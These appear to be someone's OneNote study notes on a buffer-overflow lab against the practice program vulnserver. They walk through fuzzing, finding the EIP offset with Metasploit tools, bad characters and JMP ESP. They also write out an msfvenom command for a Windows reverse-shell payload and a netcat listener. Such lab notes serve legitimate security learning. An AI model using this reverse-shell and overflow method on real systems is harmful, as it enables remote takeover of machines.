> [!caution] This page contained a drawing which was not converted.   

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-617e9c2935574cb9aeb4422d4198fc23!1-5CC9E121EFE9768B!6230/$value)

**Spiking****-**sending a bunch of random characters to a program to see if you can break it.  
**Ex script****:**
 
```
s_readline();  
s_string("STATS ");  
s_string_variable("0");

Want to control the EIP value  
The x86 processor maintains an instruction pointer (EIP) register that is a 32-bit value indicating the location in memory where the current instruction starts. 

Want to control the EIP value

msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
EXITFUNC=thread (makes exploit more stable)
-f (for file type) ; export this into c
-a (for architecture) ; x86
-b (for bad characters) "\x00" 
Resulting payload. Copy Pasta into the python script.

Set up netcat listener (based on msfvenom exploit)
Next run vulnserver.exe as administrator. Don't need immunity.

```
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-3a5d7c7e24594f40b78df6ca56d0f5a8!1-5CC9E121EFE9768B!6230/$value)  
![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-45f6fd3f022448a38614d4925ae0c980!1-5CC9E121EFE9768B!6230/$value)  
![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-04a69470e344451eafd517ab663e552f!1-5CC9E121EFE9768B!6230/$value)  

**Part 1: Finding the offset:**  
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-a182a1e283f54934a0a918cf52f64a7b!1-5CC9E121EFE9768B!6230/$value)

Want to control the EIP value  
**The x86 processor maintains an instruction pointer** **(EIP)** **register that is a 32-bit value indicating the location in memory where the current instruction starts.**

**Part 2: Finding the offset:**  
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-a182a1e283f54934a0a918cf52f64a7b!1-5CC9E121EFE9768B!6230/$value)

Want to control the EIP value

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-1c305bc2cae2476280eb20b768af8686!1-5CC9E121EFE9768B!6230/$value) ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-625204350cc9420a95841a156a40dffd!1-5CC9E121EFE9768B!6230/$value)

**Notice: Exact offset is 2003 (In other words, think if you send 2003 "A's" and then 4 "B's" the 4 B's would overwrite the EIP register. This means we control the program.**
 
# Overwriting EIP:

**Run this Script:**
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-0281488adfe34db3b759ea68de9377dd!1-5CC9E121EFE9768B!6230/$value)  

**Program response: (EIP variable is just the 4 B's we sent because the EBP variable was overflowing with AAAAAAAA)**

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-bebb62762aef473fba4792fe0d209fa5!1-5CC9E121EFE9768B!6230/$value)  

Finding Bad Characters:
 
# **Resource:** [https://github.com/cytopia/badchars](https://github.com/cytopia/badchars)
 
What are Bad Characters?
 
Characters such as \r , \n , / and ? can cause the line that's being parsed to truncate prematurely and fail to overflow the buffer, or lead to a 404 error instead of calling the vulnerable function. Characters being converted between upper and lower case is another example that will mess with shell code.
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-13d1131945974131afa1d72cf3b39e9e!1-5CC9E121EFE9768B!6230/$value)  

Run bad characters > In immunity debugger right click the ESP value > follow in dump.
 ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-b553ec15f7e243a8a26f5404955c2d25!1-5CC9E121EFE9768B!6230/$value)  

Example:

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-c8681bdd8aab4acfb43810a1ed48d075!1-5CC9E121EFE9768B!6230/$value)  

Import mona.py into immunity debugger and call the module with !mona modules

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-b2675ddc8adb45f09325691b3124a817!1-5CC9E121EFE9768B!6230/$value)  

Back in Kali: start nasm shell to look for "opt code equivalent"

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-0c9665c055e444038d55663ba16daba2!1-5CC9E121EFE9768B!6230/$value)  

nasm > JMP ESP

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-bb3ab9d4a1024bceade05c0264b5fd79!1-5CC9E121EFE9768B!6230/$value)  
![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-c1f9e020aa6d4916a93a9d2e3974eaba!1-5CC9E121EFE9768B!6230/$value)

Results after running

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-8b259e63fded4b3f8913cf09a993624e!1-5CC9E121EFE9768B!6230/$value)  
![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-fe8b43cf0c5441fbadc4dc552009b9ea!1-5CC9E121EFE9768B!6230/$value)

Set a breakpoint by hitting (alt + F2)-so that we can overwrite the EAP.
 
Run findtherightmodule.py script & notice the result:

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-a61cfbec866342bd8e9936a94801c266!1-5CC9E121EFE9768B!6230/$value)

We hit the breakpoint and overode the EIP value:

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-ba696bb71aab4be4ac43c9f00693cf12!1-5CC9E121EFE9768B!6230/$value)

Now just need to write the shell code!
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"

- EXITFUNC=thread (makes exploit more stable)
- -f (for file type) ; export this into c
- -a (for architecture) ; x86
- -b (for bad characters) "\x00"

Resulting payload. Copy Pasta into the python script.

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-97f54c965da34173aee6bc2b19610b00!1-5CC9E121EFE9768B!6230/$value)   ![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-f9c200b3a7834349a32f1bf8e6b6c187!1-5CC9E121EFE9768B!6230/$value)  

Set up netcat listener (based on msfvenom exploit)

![](https://graph.microsoft.com/v1.0/users('rachelcamurphy@gmail.com')/onenote/resources/0-8a2b646ad4e245aab350d6a59931a66c!1-5CC9E121EFE9768B!6230/$value)

Next run vulnserver.exe as administrator. Don't need immunity.
 
Note: Payload size